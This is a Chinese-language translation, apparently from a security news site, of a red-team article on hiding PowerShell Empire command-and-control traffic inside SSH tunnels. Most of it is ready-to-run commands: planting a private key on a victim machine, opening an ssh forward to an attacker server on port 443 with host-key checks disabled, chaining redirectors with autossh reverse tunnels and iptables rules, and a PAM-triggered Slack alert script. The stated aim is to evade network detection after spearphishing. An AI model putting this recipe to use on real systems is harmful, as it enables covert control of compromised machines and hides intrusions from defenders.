**![在标准SSH隧道中隐藏C&C流量](https://image.3001.net/images/20190121/1548032574_5c451a3e54749.jpg!small)**

**SHazam是一种在标准SSH隧道中隐藏C &C流量从而躲避网络检测的技术。在本文的示例中将会运行PowerShell
Empire，用于连接到受害者的localhost端口。本地端口会通过SSH连接被转发到远程Empire
server，以便让我们看到的唯一网络流量为SSH。示例中的受害者系统为OS X，但相同的技术也可以使用Plink.exe（[Putty
toolset](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)的一部分）在Windows上实现。**

**![在标准SSH隧道中隐藏C&C流量](https://image.3001.net/images/20190121/1548032607_5c451a5f52a37.png!small)**

从上图可以看到，受害者系统有一个SSH隧道被配置为侦听端口5430，并将接收到的任何内容都转发给Empire Server。Empire
Server让Empire在自己的localhost（127.0.0.1:5430）上运行和侦听同一个端口。为了使SSH流量看上去更有迷惑性，我们让SSH服务器侦听端口443而不是标准的22端口。你可以通过编辑SSH配置文件更改其侦听端口，以及云提供商防火墙配置以允许通过此端口进行通信。

在建立隧道之前，你必须创建或复制私钥到受害者系统上。必须将关联的公钥添加到empire-server的authorized_keys文件中以允许SSH连接。在本例中，我们将私钥文件放置在受害者的~/.ssh/.do.key目录。你可以通过以下命令完成这一系列操作：

    
    
    mkdir ~/.ssh
    chmod 700 ~/.ssh
    echo -----BEGIN RSA PRIVATE KEY----- >> ~/.ssh/.do.key
    echo MIIJKAIBAAKCAgEArVuMJdwgl9z9s1C0mrYV05hwUevmY+CkJaY/1iiPJSE6/AAp >> ~/.ssh/.do.key
    echo +qkMZ9nrHkBQtaQMrXPW5MQXLxU/o8LQ5QyPiy/B4FiGEfNSx//mSJvEYAXXN4zC >> ~/.ssh/.do.key
    <snipped here for brevity>
    echo RkiQ5Eir83CLCZFLRWV8wFvNkGV2krxMXDtHHFL5ars/J7tdBekmYI62eXnE5oXl >> ~/.ssh/.do.key
    echo NHky2x6YsnQf5lOkC1XyWvwg77gR2kRhb9KpOi+hp6xB42o00mpbZgyY5V4= >> ~/.ssh/.do.key
    echo -----END RSA PRIVATE KEY----- >> ~/.ssh/.do.key
    chmod 600 ~/.ssh/.do.key

为了防止任意获取私钥访问权限的人向你的empire-server执行不必要的操作，你可以在Empire
Server上进行配置更改。编辑/etc/passwd文件将其中的登录名更改为/bin/false。

    
    
    victim:x:1001:1001:Victim Guy,,,:/home/victim:/bin/false

使用受害系统上的私钥，一条简单的命令即可为你配置SSH隧道和端口。

    
    
    ssh -i ~/.ssh/.do.key  -p 443 -N -f -oStrictHostKeyChecking=no victim@empire-server.corp.com -L 5430:127.0.0.1:5430

现在，你可以配置PowerShell Empire或你自己的C2来侦听127.0.0.1:5430上的连接。这甚至在你进行域前置（ domain
fronting）等复杂配置时仍可正常工作。

就像这样，所有C2流量都被隐藏在了加密的SSH隧道内，因此你不必为C2触发任何其他网络签名而担心。

这项技术看上去非常的不错也很简单，但我相信你绝对不希望将客户的敏感数据放在他人的云主机上。如果是这样，你就需要设置其他重定向器，以将流量通过云主机转发到你自己网络中的系统上。但这么做的缺点就是操作过程会复杂很多，不过大家不用担心我已经为你们解决了所有的问题，如下所示：

![在标准SSH隧道中隐藏C&C流量](https://image.3001.net/images/20190121/1548032637_5c451a7d81d58.png!small)

C2连接通过SSH隧道转发到empire-redirector。empire-redirector上的防火墙规则将流量转发到另一个中间重定向器。最后，Empire C2会话最终登陆的内部系统会建立与最终重定向器的反向SSH连接。

在受害者计算机上运行的SSH命令如下：

    
    
    ssh -i ~/.ssh/.do.key  -p 443 -N -f -oStrictHostKeyChecking=no victim@empire-redirector.corp.com -L 5430:127.0.0.1:5431

从内部可信系统运行的SSH命令为：

    
    
    autossh -M 5431 -o ServerAliveInterval=30 -R 5433:10.10.10.185:5430 root@redirector.corp.com

你可能需要先安装autossh，但这么做是值得的，因为它会确保你的隧道能够长时间的保持运行。

Empire-Redirector的IP表规则如下：

    
    
    iptables -t nat -A OUTPUT -m addrtype --src-type LOCAL --dst-type LOCAL -p tcp -m multiport --dports 5430:65535 -j DNAT --to-destination 128.62.137.184:5432
    iptables -t nat -A POSTROUTING -m addrtype --src-type LOCAL --dst-type UNICAST -j MASQUERADE
    sysctl -w net.ipv4.conf.all.route_localnet=1

这会将端口5430到65535转发到最终重定向器，你可以使用该范围内的一个任意端口连接到受害者。

重定向器的IP表规则如下：

    
    
    sysctl -w net.ipv4.conf.all.route_localnet=1
    iptables -t nat -I PREROUTING -p tcp --dport 5432 -j DNAT --to 127.0.0.1:5433

你可能还希望在建立SSH连接时通过slack获取通知。只需将这两行添加到empire-redirector上的/etc/pam.d/sshd文件中，这样当每次成功建立SSH连接时就会自动运行我的slack通知脚本。

    
    
    session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open
    
    session optional pam_exec.so /home/root/ssh-slack-alert.sh

以下是我slack脚本中的内容：

    
    
    #!/usr/bin/env bash
    
    if [ "$PAM_USER" != "admin" ] && [ $PAM_TYPE != "close_session" ]
    then
    message="\`\`\`PamType: $PAM_TYPE\nSSH-User: $PAM_USER\nRhost: $PAM_RHOST\nServer: SSHazam\nHostname: `hostname`\`\`\`"
     
    curl -X POST \
      --data-urlencode "payload={\"channel\": \"alerts\", \"username\": \"SSHazam\", \"text\": \"${message}\", \"icon_emoji\": \":boom:\"}" \
     https://hooks.slack.com/services/YOUR/SLACK/HOOKHERE
    fi

注意！在这个更为复杂的场景中，一次只能有一个受害者连接，除非每个受害者都配置为使用empire-redirector上的不同端口和用户/私钥组合。这很烦人，但在鱼叉式钓鱼场景中相当好用。

 ***参考来源：[blackhillsinfosec](https://www.blackhillsinfosec.com/sshazam-hide-your-c2-inside-of-ssh/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

